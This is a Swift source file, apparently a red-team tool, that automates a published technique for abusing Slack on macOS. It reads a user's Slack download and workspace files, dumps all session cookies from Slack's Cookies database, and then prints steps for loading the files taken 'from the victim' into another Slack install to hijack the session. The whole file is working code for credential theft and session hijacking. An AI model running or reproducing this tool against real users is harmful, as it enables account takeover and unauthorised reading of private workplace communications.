import Cocoa
import SQLite3

//this is Swift code that automates the steps for abusing Slack as noted in Cody Thomas' post:
//https://posts.specterops.io/abusing-slack-for-offensive-operations-2343237b9282

var fileMan = FileManager.default
var uName = NSUserName()
var nm1 = ""
var nm2 = ""
var nm3 = ""
var nm4 = ""

print("\u{001B}[0;36m+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\u{001B}[0;0m")

if fileMan.fileExists(atPath: "/Users/\(uName)/Library/Application Support/Slack"){
    print("\u{001B}[0;36m[+] Slack found on this host!\u{001B}[0;0m")
    if fileMan.fileExists(atPath: "/Users/\(uName)/Library/Application Support/Slack/storage/slack-downloads"){
        print("\u{001B}[0;33m-->Found slack-downloads file\u{001B}[0;0m")
        print("\u{001B}[0;33m---->Downloads content of interest:\u{001B}[0;0m")
        let dwnURL = URL(fileURLWithPath: "/Users/\(uName)/Library/Application Support/Slack/storage/slack-downloads")
        let dwnData = try String(contentsOf: dwnURL)
        
        let dwnDataJoined = dwnData.components(separatedBy: ",")
        
        for item in dwnDataJoined{
            if item.contains("http") {
                print(item)
            }
            if item.contains("/Users/"){
                print("\u{001B}[0;36m==>\u{001B}[0;0m \(item)")
            }
        }
        
    }
    
    if fileMan.fileExists(atPath: "/Users/\(uName)/Library/Application Support/Slack/storage/slack-workspaces"){
           print("")
           print("\u{001B}[0;33m-->Found slack-workspaces file\u{001B}[0;0m")
           print("\u{001B}[0;33m---->Workspaces info of interest:\u{001B}[0;0m")
           let wkspURL = URL(fileURLWithPath: "/Users/\(uName)/Library/Application Support/Slack/storage/slack-workspaces")
           let wkspData = try String(contentsOf: wkspURL)
           
           let wkspJoined = wkspData.components(separatedBy: ",")
           
           for each in wkspJoined{
               if (each.contains("name") && !(each.contains("_"))){
                   if let index = (each.range(of: "{")?.upperBound){
                       let modified = String(each.suffix(from: index))
                       print(modified)
                   } else {
                       print(each)
                   }
                   
               }
               
               if each.contains("team_name"){
                   print("\u{001B}[0;36m==>\u{001B}[0;0m \(each)")
               }
               
               if each.contains("team_url"){
                   print("\u{001B}[0;36m==>\u{001B}[0;0m \(each)")
               }
               
               if each.contains("unreads"){
                   print("\u{001B}[0;36m==>\u{001B}[0;0m \(each)")
               }
           }
       }
    
    
    if fileMan.fileExists(atPath: "/Users/\(uName)/Library/Application Support/Slack/Cookies"){
        print("")
        print("\u{001B}[0;33m-->Found Slack Cookies Database\u{001B}[0;0m")
        print("\u{001B}[0;33m---->Cookies found:\u{001B}[0;0m")
        var db : OpaquePointer?
        var dbURL = URL(fileURLWithPath: "/Users/\(uName)/Library/Application Support/Slack/Cookies")
        if sqlite3_open(dbURL.path, &db) != SQLITE_OK{
            print("[-] Could not open the Slack Cookies database")
        } else {
            print("Format: host_key \u{001B}[0;36m||\u{001B}[0;0m name \u{001B}[0;36m||\u{001B}[0;0m value ")
            let queryString = "select datetime(creation_utc, 'unixepoch') as creation, host_key, name, value from cookies order by creation;"
            var queryStatement: OpaquePointer? = nil
            
            if sqlite3_prepare_v2(db, queryString, -1, &queryStatement, nil) == SQLITE_OK{
                while sqlite3_step(queryStatement) == SQLITE_ROW{
                    let col1 = sqlite3_column_text(queryStatement, 0)
                    if col1 != nil{
                        nm1 = String(cString: col1!)
                    }
                    
                    let col2 = sqlite3_column_text(queryStatement, 1)
                    if col2 != nil{
                        nm2 = String(cString: col2!)
                    }
                    
                    let col3 = sqlite3_column_text(queryStatement, 2)
                    if col3 != nil{
                        nm3 = String(cString: col3!)
                    }
                    
                    let col4 = sqlite3_column_text(queryStatement, 3)
                    if col4 != nil {
                        nm4 = String(cString:col4!)
                    }
                    
                    print("\(nm2) \u{001B}[0;36m||\u{001B}[0;0m \(nm3) \u{001B}[0;36m||\u{001B}[0;0m \(nm4)")
            }
                
        }
            else {
                print("[-] Cookies database not found")
            }
    }
    
}
    
    print("\u{001B}[0;36m+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\u{001B}[0;0m")
    print("Steps from Cody's article to load the Slack files found:")
    print("1. Install a new instance of slack (but don’t sign in to anything)")
    print("2. Close Slack and replace the automatically created Slack/storage/slack-workspaces and Slack/Cookies files with the two you downloaded from the victim")
    print("3. Start Slack")
    print("\u{001B}[0;36m+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\u{001B}[0;0m")
    print("DONE!")
   
}
    


